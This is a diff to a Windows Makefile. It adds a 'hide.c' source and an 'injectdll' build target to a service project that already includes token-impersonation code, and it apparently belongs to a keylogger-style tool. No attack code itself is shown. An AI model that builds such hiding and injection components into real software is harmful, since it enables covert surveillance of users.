@@ -8,7 +8,7 @@ DEL = del
 #svc.exe related stuff
 DIR_SVC=svc\srcs
 SRCS_SVC = $(DIR_SVC)\main.c $(DIR_SVC)\error_handling.c $(DIR_SVC)\svc_manager.c \
-			$(DIR_SVC)\svc_controller.c $(DIR_SVC)\svc_utils.c $(DIR_SVC)\impersonate_token.c $(DIR_SVC)\log.c
+			$(DIR_SVC)\svc_controller.c $(DIR_SVC)\svc_utils.c $(DIR_SVC)\impersonate_token.c $(DIR_SVC)\hide.c $(DIR_SVC)\log.c
 OBJS_SVC = $(SRCS_SVC:.c=.obj)
 INCL_SVC = /I .\svc\includes
 LIBS_SVC = Kernel32.lib Advapi32.lib Wtsapi32.lib
@@ -16,7 +16,7 @@ SVC = svc.exe
 
 DEBUG_FILE = svc.pdb svc.ilk
 
-all: $(SVC)
+all: $(SVC) injectdll
 
 #linker
 $(SVC): $(OBJS_SVC)
@@ -26,11 +26,14 @@ $(SVC): $(OBJS_SVC)
 .c.obj:
 	$(CC) $(CCFLAGS) $(CCFLAG_DEBUG) $(INCL_SVC) /c $< /Fo:$@
 
+injectdll :
+	$(CC) /LD .\dll\srcs\inject.c ntdll.lib Kernel32.lib
+
 #clean
 clean:
-	$(DEL) $(OBJS_SVC)
+	$(DEL) $(OBJS_SVC) inject.obj svc.pdb winkey.pdb winkey.ilk svc.ilk
 fclean: clean
-	$(DEL) $(SVC)
+	$(DEL) $(SVC) inject.dll 
 #quiet nmake w/ /C
 re: fclean
 	@nmake -f .\Makefile.svc /C all
